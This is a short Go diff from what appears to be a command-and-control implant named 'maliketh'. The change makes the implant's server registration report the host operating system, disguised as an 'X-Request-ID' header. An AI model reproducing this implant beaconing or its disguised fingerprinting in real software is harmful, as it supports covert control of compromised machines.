@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"runtime"
 
 	. "maliketh/pkg/config"
 	"maliketh/pkg/crypto"
@@ -47,8 +48,12 @@ func Register(serverUrl string, publicKeyB64 string, privateKeyB64 string) (mode
 		return models.MalleableProfile{}, errors.Wrap(err, "Failed to create request")
 	}
 
+	// get operating system
+	os := runtime.GOOS
+
 	request.Header.Set("User-Agent", REGISTER_USER_AGENT)
 	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("X-Request-ID", os)
 
 	client := &http.Client{}
 	resp, err := client.Do(request)
